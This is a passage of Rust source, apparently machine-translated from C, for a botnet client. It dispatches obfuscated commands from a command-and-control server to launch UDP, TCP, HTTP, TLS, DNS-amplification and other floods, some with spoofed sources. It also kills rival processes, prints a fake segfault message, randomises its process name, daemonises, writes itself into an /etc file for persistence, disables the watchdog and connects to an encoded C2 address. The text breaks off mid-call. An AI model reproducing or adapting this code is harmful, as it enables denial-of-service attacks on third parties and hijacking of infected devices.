            || atoi(*argv.offset(2 as libc::c_int as isize) as *const libc::c_char)
                <= 0 as libc::c_int
            || atoi(*argv.offset(3 as libc::c_int as isize) as *const libc::c_char)
                <= 0 as libc::c_int
        {
            return;
        }
        let mut ip: *mut libc::c_uchar = *argv.offset(1 as libc::c_int as isize);
        let mut port: libc::c_int = atoi(
            *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
        );
        let mut time_0: libc::c_int = atoi(
            *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
        );
        let mut spoofed: libc::c_int = if argc > 4 as libc::c_int {
            atoi(*argv.offset(4 as libc::c_int as isize) as *const libc::c_char)
        } else {
            32 as libc::c_int
        };
        let mut packetsize: libc::c_int = if argc > 5 as libc::c_int {
            atoi(*argv.offset(5 as libc::c_int as isize) as *const libc::c_char)
        } else {
            65507 as libc::c_int
        };
        let mut pollinterval: libc::c_int = if argc > 6 as libc::c_int {
            atoi(*argv.offset(6 as libc::c_int as isize) as *const libc::c_char)
        } else {
            1000 as libc::c_int
        };
        let mut sleepcheck: libc::c_int = if argc > 7 as libc::c_int {
            atoi(*argv.offset(7 as libc::c_int as isize) as *const libc::c_char)
        } else {
            1000000 as libc::c_int
        };
        let mut sleeptime: libc::c_int = if argc > 8 as libc::c_int {
            atoi(*argv.offset(8 as libc::c_int as isize) as *const libc::c_char)
        } else {
            0 as libc::c_int
        };
        if !(strstr(
            ip as *const libc::c_char,
            b",\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
        {
            let mut hi: *mut libc::c_uchar = strtok(
                ip as *mut libc::c_char,
                b",\0" as *const u8 as *const libc::c_char,
            ) as *mut libc::c_uchar;
            while !hi.is_null() {
                if listFork() == 0 {
                    sendUDP(
                        hi,
                        port,
                        time_0,
                        spoofed,
                        packetsize,
                        pollinterval,
                        sleepcheck,
                        sleeptime,
                    );
                    _exit(0 as libc::c_int);
                }
                hi = strtok(
                    0 as *mut libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ) as *mut libc::c_uchar;
            }
        } else if listFork() == 0 {
            sendUDP(
                ip,
                port,
                time_0,
                spoofed,
                packetsize,
                pollinterval,
                sleepcheck,
                sleeptime,
            );
            _exit(0 as libc::c_int);
        }
        return;
    } else {
        if strcmp(
            *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
            okic(b"cD|\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
        ) == 0
        {
            if argc < 5 as libc::c_int
                || atoi(*argv.offset(3 as libc::c_int as isize) as *const libc::c_char)
                    <= 0 as libc::c_int
                || atoi(*argv.offset(2 as libc::c_int as isize) as *const libc::c_char)
                    == -(1 as libc::c_int)
            {
                return;
            }
            let mut ip_0: *mut libc::c_uchar = *argv.offset(1 as libc::c_int as isize);
            let mut port_0: libc::c_int = atoi(
                *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
            );
            let mut time_1: libc::c_int = atoi(
                *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
            );
            let mut spoofed_0: libc::c_int = 32 as libc::c_int;
            let mut flags: *mut libc::c_uchar = *argv.offset(4 as libc::c_int as isize);
            let mut pollinterval_0: libc::c_int = 10 as libc::c_int;
            let mut psize: libc::c_int = atoi(
                *argv.offset(5 as libc::c_int as isize) as *const libc::c_char,
            );
            if !(strstr(
                ip_0 as *const libc::c_char,
                b",\0" as *const u8 as *const libc::c_char,
            ))
                .is_null()
            {
                let mut hi_0: *mut libc::c_uchar = strtok(
                    ip_0 as *mut libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ) as *mut libc::c_uchar;
                while !hi_0.is_null() {
                    if listFork() == 0 {
                        ftcp(
                            hi_0,
                            port_0,
                            time_1,
                            spoofed_0,
                            flags,
                            psize,
                            pollinterval_0,
                        );
                        _exit(0 as libc::c_int);
                    }
                    hi_0 = strtok(
                        0 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                }
            } else if listFork() == 0 {
                ftcp(ip_0, port_0, time_1, spoofed_0, flags, psize, pollinterval_0);
                _exit(0 as libc::c_int);
            }
            return;
        } else {
            if strcmp(
                *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                eika(
                    b"\t\x1C\x9D6\xB0\xDA\x1E\0" as *const u8 as *const libc::c_char
                        as *mut libc::c_char,
                ),
            ) == 0
            {
                if argc < 5 as libc::c_int
                    || atoi(
                        *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                    ) <= 0 as libc::c_int
                    || atoi(
                        *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                    ) == -(1 as libc::c_int)
                {
                    return;
                }
                let mut ip_1: *mut libc::c_uchar = *argv
                    .offset(1 as libc::c_int as isize);
                let mut port_1: libc::c_int = atoi(
                    *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                );
                let mut time_2: libc::c_int = atoi(
                    *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                );
                let mut spoofed_1: libc::c_int = 32 as libc::c_int;
                let mut flags_0: *mut libc::c_uchar = *argv
                    .offset(4 as libc::c_int as isize);
                let mut pollinterval_1: libc::c_int = 10 as libc::c_int;
                let mut psize_0: libc::c_int = atoi(
                    *argv.offset(5 as libc::c_int as isize) as *const libc::c_char,
                );
                if !(strstr(
                    ip_1 as *const libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ))
                    .is_null()
                {
                    let mut hi_1: *mut libc::c_uchar = strtok(
                        ip_1 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                    while !hi_1.is_null() {
                        if listFork() == 0 {
                            ovtcp(
                                hi_1,
                                port_1,
                                time_2,
                                spoofed_1,
                                flags_0,
                                psize_0,
                                pollinterval_1,
                            );
                            _exit(0 as libc::c_int);
                        }
                        hi_1 = strtok(
                            0 as *mut libc::c_char,
                            b",\0" as *const u8 as *const libc::c_char,
                        ) as *mut libc::c_uchar;
                    }
                } else if listFork() == 0 {
                    ovtcp(
                        ip_1,
                        port_1,
                        time_2,
                        spoofed_1,
                        flags_0,
                        psize_0,
                        pollinterval_1,
                    );
                    _exit(0 as libc::c_int);
                }
            } else if strcmp(
                *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                okic(b"ecc|\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                if argc < 6 as libc::c_int {
                    return;
                }
                if !(strstr(
                    *argv.offset(1 as libc::c_int as isize) as *const libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ))
                    .is_null()
                {
                    let mut hi_2: *mut libc::c_uchar = strtok(
                        *argv.offset(1 as libc::c_int as isize) as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                    while !hi_2.is_null() {
                        if listFork() == 0 {
                            sendHTTP(
                                *argv.offset(1 as libc::c_int as isize)
                                    as *mut libc::c_char,
                                *argv.offset(2 as libc::c_int as isize)
                                    as *mut libc::c_char,
                                atoi(
                                    *argv.offset(3 as libc::c_int as isize) as *mut libc::c_char,
                                ) as uint16_t,
                                *argv.offset(4 as libc::c_int as isize)
                                    as *mut libc::c_char,
                                atoi(
                                    *argv.offset(5 as libc::c_int as isize) as *mut libc::c_char,
                                ),
                                atoi(
                                    *argv.offset(6 as libc::c_int as isize) as *mut libc::c_char,
                                ),
                            );
                            _exit(0 as libc::c_int);
                        }
                        hi_2 = strtok(
                            0 as *mut libc::c_char,
                            b",\0" as *const u8 as *const libc::c_char,
                        ) as *mut libc::c_uchar;
                    }
                } else if listFork() == 0 {
                    sendHTTP(
                        *argv.offset(1 as libc::c_int as isize) as *mut libc::c_char,
                        *argv.offset(2 as libc::c_int as isize) as *mut libc::c_char,
                        atoi(
                            *argv.offset(3 as libc::c_int as isize) as *mut libc::c_char,
                        ) as uint16_t,
                        *argv.offset(4 as libc::c_int as isize) as *mut libc::c_char,
                        atoi(
                            *argv.offset(5 as libc::c_int as isize) as *mut libc::c_char,
                        ),
                        atoi(
                            *argv.offset(6 as libc::c_int as isize) as *mut libc::c_char,
                        ),
                    );
                    _exit(0 as libc::c_int);
                }
            } else if strcmp(
                *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                okic(b"ej~-\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                if argc < 4 as libc::c_int
                    || atoi(
                        *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                    ) < 1 as libc::c_int
                    || atoi(
                        *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                    ) < 1 as libc::c_int
                {
                    return;
                }
                let mut ip_2: *mut libc::c_uchar = *argv
                    .offset(1 as libc::c_int as isize);
                let mut port_2: libc::c_int = atoi(
                    *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                );
                let mut time_3: libc::c_int = atoi(
                    *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                );
                if !(strstr(
                    ip_2 as *const libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ))
                    .is_null()
                {
                    let mut hi_3: *mut libc::c_uchar = strtok(
                        ip_2 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                    while !hi_3.is_null() {
                        if listFork() == 0 {
                            sendHLD(hi_3, port_2, time_3);
                            close(fd_cnc);
                            _exit(0 as libc::c_int);
                        }
                        hi_3 = strtok(
                            0 as *mut libc::c_char,
                            b",\0" as *const u8 as *const libc::c_char,
                        ) as *mut libc::c_uchar;
                    }
                } else if listFork() == 0 {
                    sendHLD(ip_2, port_2, time_3);
                    _exit(0 as libc::c_int);
                }
            } else if strcmp(
                *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                okic(b"51,U\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                if argc < 3 as libc::c_int
                    || atoi(
                        *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                    ) < 0 as libc::c_int
                {
                    return;
                }
                let mut ip_3: *mut libc::c_uchar = *argv
                    .offset(1 as libc::c_int as isize);
                let mut port_3: libc::c_int = atoi(
                    *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                );
                let mut time_4: libc::c_int = atoi(
                    *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                );
                if !(strstr(
                    ip_3 as *const libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ))
                    .is_null()
                {
                    let mut hi_4: *mut libc::c_uchar = strtok(
                        ip_3 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                    if !hi_4.is_null() {
                        if listFork() == 0 {
                            sendJNK(hi_4, port_3, time_4);
                        }
                        _exit(0 as libc::c_int);
                    }
                    hi_4 = strtok(
                        0 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                } else if listFork() == 0 {
                    sendJNK(ip_3, port_3, time_4);
                    _exit(0 as libc::c_int);
                }
            } else if strcmp(
                *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                okic(b"c~6\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                if argc < 3 as libc::c_int
                    || atoi(
                        *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                    ) < 0 as libc::c_int
                {
                    return;
                }
                let mut ip_4: *mut libc::c_uchar = *argv
                    .offset(1 as libc::c_int as isize);
                let mut port_4: libc::c_int = atoi(
                    *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                );
                let mut time_5: libc::c_int = atoi(
                    *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                );
                if !(strstr(
                    ip_4 as *const libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ))
                    .is_null()
                {
                    let mut hi_5: *mut libc::c_uchar = strtok(
                        ip_4 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                    if !hi_5.is_null() {
                        if listFork() == 0 {
                            sendTLS(hi_5, port_4, time_5);
                        }
                        _exit(0 as libc::c_int);
                    }
                    hi_5 = strtok(
                        0 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                } else if listFork() == 0 {
                    sendTLS(ip_4, port_4, time_5);
                    _exit(0 as libc::c_int);
                }
            } else if strcmp(
                *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                okic(b"6c-\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                if argc < 4 as libc::c_int
                    || atoi(
                        *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                    ) < 1 as libc::c_int
                    || atoi(
                        *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                    ) < 1 as libc::c_int
                {
                    return;
                }
                let mut ip_5: *mut libc::c_uchar = *argv
                    .offset(1 as libc::c_int as isize);
                let mut port_5: libc::c_int = atoi(
                    *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                );
                let mut time_6: libc::c_int = atoi(
                    *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                );
                if !(strstr(
                    ip_5 as *const libc::c_char,
                    b",\0" as *const u8 as *const libc::c_char,
                ))
                    .is_null()
                {
                    let mut hi_6: *mut libc::c_uchar = strtok(
                        ip_5 as *mut libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                    while !hi_6.is_null() {
                        if listFork() == 0 {
                            sendPkt(hi_6, port_5, time_6);
                            _exit(0 as libc::c_int);
                        }
                        hi_6 = strtok(
                            0 as *mut libc::c_char,
                            b",\0" as *const u8 as *const libc::c_char,
                        ) as *mut libc::c_uchar;
                    }
                } else if listFork() == 0 {
                    sendPkt(ip_5, port_5, time_6);
                    _exit(0 as libc::c_int);
                }
                return;
            } else {
                if strcmp(
                    *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                    okic(
                        b"-,6\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
                    ),
                ) == 0
                {
                    if argc < 4 as libc::c_int
                        || atoi(
                            *argv.offset(2 as libc::c_int as isize)
                                as *const libc::c_char,
                        ) < 1 as libc::c_int
                        || atoi(
                            *argv.offset(3 as libc::c_int as isize)
                                as *const libc::c_char,
                        ) < 1 as libc::c_int
                    {
                        return;
                    }
                    let mut ip_6: *mut libc::c_uchar = *argv
                        .offset(1 as libc::c_int as isize);
                    let mut port_6: libc::c_int = atoi(
                        *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
                    );
                    let mut time_7: libc::c_int = atoi(
                        *argv.offset(3 as libc::c_int as isize) as *const libc::c_char,
                    );
                    if !(strstr(
                        ip_6 as *const libc::c_char,
                        b",\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                    {
                        let mut hi_7: *mut libc::c_uchar = strtok(
                            ip_6 as *mut libc::c_char,
                            b",\0" as *const u8 as *const libc::c_char,
                        ) as *mut libc::c_uchar;
                        while !hi_7.is_null() {
                            if listFork() == 0 {
                                DNSw(hi_7, port_6, time_7);
                                _exit(0 as libc::c_int);
                            }
                            hi_7 = strtok(
                                0 as *mut libc::c_char,
                                b",\0" as *const u8 as *const libc::c_char,
                            ) as *mut libc::c_uchar;
                        }
                    } else if listFork() == 0 {
                        DNSw(ip_6, port_6, time_7);
                        _exit(0 as libc::c_int);
                    }
                    return;
                } else {
                    if strcmp(
                        *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
                        okic(
                            b"6D7,,mv\0" as *const u8 as *const libc::c_char
                                as *mut libc::c_char,
                        ),
                    ) == 0
                    {
                        if strcmp(
                            *argv.offset(1 as libc::c_int as isize)
                                as *const libc::c_char,
                            okic(
                                b"j,\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) == 0
                        {
                            if j83jPid == 0 as libc::c_int {
                                j83jdt(fd_cnc);
                                if j83jPid != 0 as libc::c_int { return } else { return }
                            } else {
                                return
                            }
                        } else if strcmp(
                            *argv.offset(1 as libc::c_int as isize)
                                as *const libc::c_char,
                            okic(
                                b"jdd\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) == 0
                        {
                            if j83jPid != 0 as libc::c_int {
                                if kill(j83jPid, 9 as libc::c_int) == 0 as libc::c_int {
                                    j83jPid = 0 as libc::c_int;
                                    return;
                                } else {
                                    return
                                }
                            } else {
                                return
                            }
                        } else {
                            return
                        }
                    } else {
                        if strcmp(
                            *argv.offset(0 as libc::c_int as isize)
                                as *const libc::c_char,
                            okic(
                                b"jge\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) == 0
                        {
                            if argc < 5 as libc::c_int {
                                return;
                            }
                            if listFork() == 0 {
                                pktSend(
                                    *argv.offset(1 as libc::c_int as isize)
                                        as *mut libc::c_char,
                                    atoi(
                                        *argv.offset(2 as libc::c_int as isize)
                                            as *const libc::c_char,
                                    ),
                                    atoi(
                                        *argv.offset(3 as libc::c_int as isize)
                                            as *const libc::c_char,
                                    ),
                                    atoi(
                                        *argv.offset(4 as libc::c_int as isize)
                                            as *const libc::c_char,
                                    ),
                                    atoi(
                                        *argv.offset(5 as libc::c_int as isize)
                                            as *const libc::c_char,
                                    ),
                                );
                            }
                        } else if strcmp(
                            *argv.offset(0 as libc::c_int as isize)
                                as *const libc::c_char,
                            okic(
                                b".~7DU,1v6m\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) == 0
                        {
                            if argc < 2 as libc::c_int {
                                return;
                            }
                            if listFork() == 0 {
                                bnrse(
                                    *argv.offset(1 as libc::c_int as isize)
                                        as *mut libc::c_char,
                                    atoi(
                                        *argv.offset(2 as libc::c_int as isize)
                                            as *const libc::c_char,
                                    ),
                                );
                            }
                        } else if strcmp(
                            *argv.offset(0 as libc::c_int as isize)
                                as *const libc::c_char,
                            okic(
                                b"6cj|\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) == 0
                        {
                            let mut killed: libc::c_int = 0 as libc::c_int;
                            let mut i_0: libc::c_ulong = 0;
                            i_0 = 0 as libc::c_int as libc::c_ulong;
                            while i_0 < numpids {
                                if *pids.offset(i_0 as isize)
                                    != 0 as libc::c_int as libc::c_uint
                                    && *pids.offset(i_0 as isize) != getpid() as libc::c_uint
                                {
                                    kill(
                                        *pids.offset(i_0 as isize) as __pid_t,
                                        9 as libc::c_int,
                                    );
                                    killed += 1;
                                }
                                i_0 = i_0.wrapping_add(1);
                            }
                            killed > 0 as libc::c_int;
                        } else if strcmp(
                            *argv.offset(0 as libc::c_int as isize)
                                as *const libc::c_char,
                            b"ARK\0" as *const u8 as *const libc::c_char,
                        ) == 0
                        {
                            if argc < 4 as libc::c_int
                                || atoi(
                                    *argv.offset(2 as libc::c_int as isize)
                                        as *const libc::c_char,
                                ) < 1 as libc::c_int
                                || atoi(
                                    *argv.offset(3 as libc::c_int as isize)
                                        as *const libc::c_char,
                                ) < 1 as libc::c_int
                            {
                                return;
                            }
                            let mut ip_7: *mut libc::c_uchar = *argv
                                .offset(1 as libc::c_int as isize);
                            let mut port_7: libc::c_int = atoi(
                                *argv.offset(2 as libc::c_int as isize)
                                    as *const libc::c_char,
                            );
                            let mut time_8: libc::c_int = atoi(
                                *argv.offset(3 as libc::c_int as isize)
                                    as *const libc::c_char,
                            );
                            if !(strstr(
                                ip_7 as *const libc::c_char,
                                b",\0" as *const u8 as *const libc::c_char,
                            ))
                                .is_null()
                            {
                                let mut hi_8: *mut libc::c_uchar = strtok(
                                    ip_7 as *mut libc::c_char,
                                    b",\0" as *const u8 as *const libc::c_char,
                                ) as *mut libc::c_uchar;
                                while !hi_8.is_null() {
                                    if listFork() == 0 {
                                        sendARK(hi_8, port_7, time_8);
                                        _exit(0 as libc::c_int);
                                    }
                                    hi_8 = strtok(
                                        0 as *mut libc::c_char,
                                        b",\0" as *const u8 as *const libc::c_char,
                                    ) as *mut libc::c_uchar;
                                }
                            } else if listFork() == 0 {
                                sendARK(ip_7, port_7, time_8);
                                _exit(0 as libc::c_int);
                            }
                            return;
                        } else {
                            if !(strstr(
                                *argv.offset(0 as libc::c_int as isize)
                                    as *const libc::c_char,
                                b"ADNS\0" as *const u8 as *const libc::c_char,
                            ))
                                .is_null()
                            {
                                get = socket(
                                    2 as libc::c_int,
                                    SOCK_RAW as libc::c_int,
                                    IPPROTO_RAW as libc::c_int,
                                );
                                if get < 0 as libc::c_int {
                                    return;
                                }
                                if argc < 5 as libc::c_int {
                                    return;
                                }
                                srand(time(0 as *mut time_t) as libc::c_uint);
                                let mut num_threads: libc::c_int = atoi(
                                    *argv.offset(5 as libc::c_int as isize)
                                        as *const libc::c_char,
                                );
                                let mut i_1: libc::c_int = 0;
                                download(
                                    *argv.offset(4 as libc::c_int as isize)
                                        as *mut libc::c_char,
                                    b"DNS.txt\0" as *const u8 as *const libc::c_char
                                        as *mut libc::c_char,
                                );
                                let vla = num_threads as usize;
                                let mut td: Vec::<thread_data> = ::std::vec::from_elem(
                                    thread_data {
                                        target: 0 as *mut libc::c_char,
                                        dport: 0,
                                        time: 0,
                                    },
                                    vla,
                                );
                                i_1 = 0 as libc::c_int;
                                while i_1 < num_threads {
                                    let ref mut fresh113 = (*td
                                        .as_mut_ptr()
                                        .offset(i_1 as isize))
                                        .target;
                                    *fresh113 = *argv.offset(1 as libc::c_int as isize)
                                        as *mut libc::c_char;
                                    (*td.as_mut_ptr().offset(i_1 as isize))
                                        .dport = atoi(
                                        *argv.offset(2 as libc::c_int as isize)
                                            as *const libc::c_char,
                                    );
                                    (*td.as_mut_ptr().offset(i_1 as isize))
                                        .time = atoi(
                                        *argv.offset(3 as libc::c_int as isize)
                                            as *const libc::c_char,
                                    );
                                    dnsflood(
                                        &mut *td.as_mut_ptr().offset(i_1 as isize)
                                            as *mut thread_data as *mut libc::c_void,
                                    );
                                    i_1 += 1;
                                }
                                return;
                            }
                        }
                    }
                }
            }
        }
    };
}
#[no_mangle]
pub unsafe extern "C" fn getBuild() -> *mut libc::c_char {
    return b"x86_64\0" as *const u8 as *const libc::c_char as *mut libc::c_char;
}
#[no_mangle]
pub unsafe extern "C" fn singleton_connect(
    mut name: *const libc::c_char,
) -> libc::c_int {
    let mut len: libc::c_int = 0;
    let mut tmpd: libc::c_int = 0;
    let mut addr: sockaddr_un = {
        let mut init = sockaddr_un {
            sun_family: 0 as libc::c_int as sa_family_t,
            sun_path: [0; 108],
        };
        init
    };
    tmpd = socket(1 as libc::c_int, SOCK_DGRAM as libc::c_int, 0 as libc::c_int);
    if tmpd < 0 as libc::c_int {
        return -(1 as libc::c_int);
    }
    addr.sun_family = 1 as libc::c_int as sa_family_t;
    strcpy((addr.sun_path).as_mut_ptr(), name);
    len = (2 as libc::c_ulong).wrapping_add(strlen(name)) as libc::c_int;
    let mut ret: libc::c_int = 0;
    let mut retries: libc::c_uint = 1 as libc::c_int as libc::c_uint;
    loop {
        ret = bind(
            tmpd,
            &mut addr as *mut sockaddr_un as *mut sockaddr,
            len as socklen_t,
        );
        if ret == 0 as libc::c_int {
            return 0 as libc::c_int
        } else {
            if *__errno_location() == 98 as libc::c_int {
                ret = connect(
                    tmpd,
                    &mut addr as *mut sockaddr_un as *mut sockaddr,
                    ::std::mem::size_of::<sockaddr_un>() as libc::c_ulong as socklen_t,
                );
                if ret != 0 as libc::c_int {
                    if *__errno_location() == 111 as libc::c_int {
                        unlink(name);
                    }
                } else {
                    return 1 as libc::c_int
                }
            }
            let fresh114 = retries;
            retries = retries.wrapping_sub(1);
            if !(fresh114 > 0 as libc::c_int as libc::c_uint) {
                break;
            }
        }
    }
    close(tmpd);
    return -(1 as libc::c_int);
}
unsafe fn main_0(
    mut argc: libc::c_int,
    mut argv: *mut *mut libc::c_char,
) -> libc::c_int {
    fprintf(
        stderr,
        b"perror: EWOULDBLOCK\nSegmentation fault (core dumped)\n\0" as *const u8
            as *const libc::c_char,
    );
    if singleton_connect(b"enemyv2.1.lock\0" as *const u8 as *const libc::c_char) != 0 {
        exit(1 as libc::c_int);
    }
    srand(
        (time(0 as *mut time_t) ^ getpid() as libc::c_long ^ getppid() as libc::c_long)
            as libc::c_uint,
    );
    init_rand(
        (time(0 as *mut time_t) ^ getpid() as libc::c_long ^ getppid() as libc::c_long)
            as uint32_t,
    );
    let mut pname: [libc::c_char; 13] = [0; 13];
    rand_str(pname.as_mut_ptr(), 12 as libc::c_int as size_t);
    let mut asds: libc::c_int = 0;
    let mut space: size_t = 0 as libc::c_int as size_t;
    asds = 0 as libc::c_int;
    while asds < argc {
        let mut length: size_t = strlen(*argv.offset(asds as isize));
        space = (space as libc::c_ulong)
            .wrapping_add(length.wrapping_add(1 as libc::c_int as libc::c_ulong))
            as size_t as size_t;
        asds += 1;
    }
    memset(
        *argv.offset(0 as libc::c_int as isize) as *mut libc::c_void,
        '\0' as i32,
        space,
    );
    strncpy(
        *argv.offset(0 as libc::c_int as isize),
        pname.as_mut_ptr(),
        space.wrapping_sub(1 as libc::c_int as libc::c_ulong),
    );
    prctl(
        15 as libc::c_int,
        pname.as_mut_ptr(),
        0 as *mut libc::c_void,
        0 as *mut libc::c_void,
        0 as *mut libc::c_void,
    );
    let mut pid1: pid_t = 0;
    let mut pid2: pid_t = 0;
    let mut status: libc::c_int = 0;
    pid1 = fork();
    if pid1 != 0 {
        waitpid(pid1, &mut status, 0 as libc::c_int);
        exit(0 as libc::c_int);
    } else {
        if pid1 == 0 {
            pid2 = fork();
            if pid2 != 0 {
                exit(0 as libc::c_int);
            } else {
                pid2 == 0;
            }
        }
    }
    setsid();
    setuid(0 as libc::c_int as __uid_t);
    seteuid(0 as libc::c_int as __uid_t);
    signal(
        17 as libc::c_int,
        ::std::mem::transmute::<
            libc::intptr_t,
            __sighandler_t,
        >(1 as libc::c_int as libc::intptr_t),
    );
    signal(
        13 as libc::c_int,
        ::std::mem::transmute::<
            libc::intptr_t,
            __sighandler_t,
        >(1 as libc::c_int as libc::intptr_t),
    );
    let mut cwd: [libc::c_char; 256] = [0; 256];
    let mut file: *mut FILE = 0 as *mut FILE;
    let mut str: [libc::c_char; 16] = [0; 16];
    sprintf(
        str.as_mut_ptr(),
        b"/etc/%s\0" as *const u8 as *const libc::c_char,
        okic(b"=ru_Brf_\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
    );
    file = fopen(str.as_mut_ptr(), b"r\0" as *const u8 as *const libc::c_char);
    if file.is_null() {
        file = fopen(str.as_mut_ptr(), b"r\0" as *const u8 as *const libc::c_char);
    }
    if !file.is_null() {
        let mut outfile: [libc::c_char; 256] = [0; 256];
        let mut buf: [libc::c_char; 1024] = [0; 1024];
        let mut i_0: libc::c_int = strlen(*argv.offset(0 as libc::c_int as isize))
            as libc::c_int;
        let mut d: libc::c_int = 0 as libc::c_int;
        getcwd(cwd.as_mut_ptr(), 256 as libc::c_int as size_t);
        if strcmp(cwd.as_mut_ptr(), b"/\0" as *const u8 as *const libc::c_char) != 0 {
            while *(*argv.offset(0 as libc::c_int as isize)).offset(i_0 as isize)
                as libc::c_int != '/' as i32
            {
                i_0 -= 1;
            }
            sprintf(
                outfile.as_mut_ptr(),
                b"%s%s\n\0" as *const u8 as *const libc::c_char,
                cwd.as_mut_ptr(),
                (*argv.offset(0 as libc::c_int as isize)).offset(i_0 as isize),
            );
            while feof(file) == 0 {
                fgets(buf.as_mut_ptr(), 1024 as libc::c_int, file);
                if strcasecmp(buf.as_mut_ptr(), outfile.as_mut_ptr()) == 0 {
                    d += 1;
                }
            }
            if d == 0 as libc::c_int {
                let mut out: *mut FILE = 0 as *mut FILE;
                fclose(file);
                out = fopen(
                    str.as_mut_ptr(),
                    b"w\0" as *const u8 as *const libc::c_char,
                );
                if !out.is_null() {
                    fputs(outfile.as_mut_ptr(), out);
                    fclose(out);
                }
            } else {
                fclose(file);
            }
        } else {
            fclose(file);
        }
    }
    let mut wfd: libc::c_int = 0;
    wfd = open(b"/dev/watchdog\0" as *const u8 as *const libc::c_char, 2 as libc::c_int);
    if wfd != -(1 as libc::c_int)
        || {
            wfd = open(
                b"/dev/misc/watchdog\0" as *const u8 as *const libc::c_char,
                2 as libc::c_int,
            );
            wfd != -(1 as libc::c_int)
        }
    {
        let mut one: libc::c_int = 1 as libc::c_int;
        ioctl(
            wfd,
            0x80045704 as libc::c_uint as libc::c_ulong,
            &mut one as *mut libc::c_int,
        );
        close(wfd);
        wfd = 0 as libc::c_int;
    }
    LOCAL_ADDR = util_local_addr();
    coil_xywz(getpid());
    let mut rdbuf: [libc::c_char; 512] = [0; 512];
    let mut got: libc::c_int = 0 as libc::c_int;
    let mut i_1: libc::c_int = 0 as libc::c_int;
    let mut read_set: libc::c_int = 0 as libc::c_int;
    let mut tv: timeval = timeval { tv_sec: 0, tv_usec: 0 };
    let mut node: libc::c_int = 0 as libc::c_int;
    let mut _time: libc::c_int = 0 as libc::c_int;
    let mut decodedshit_0: *mut *mut libc::c_char = calloc(
        500 as libc::c_int as libc::c_ulong,
        (::std::mem::size_of::<libc::c_char>() as libc::c_ulong)
            .wrapping_mul(256 as libc::c_int as libc::c_ulong),
    ) as *mut *mut libc::c_char;
    while _time <= 3600 as libc::c_int {
        fd_cnc = socket(
            2 as libc::c_int,
            SOCK_STREAM as libc::c_int,
            IPPROTO_TCP as libc::c_int,
        );
        if fd_cnc == -(1 as libc::c_int) {
            close(fd_cnc);
        }
        if connectTimeout(
            fd_cnc,
            eika(
                b"\xFC\x86\xADt \xAD\xE1\x9AR\xAD\x86 \0" as *const u8
                    as *const libc::c_char as *mut libc::c_char,
            ),
            7 as libc::c_int,
            7 as libc::c_int,
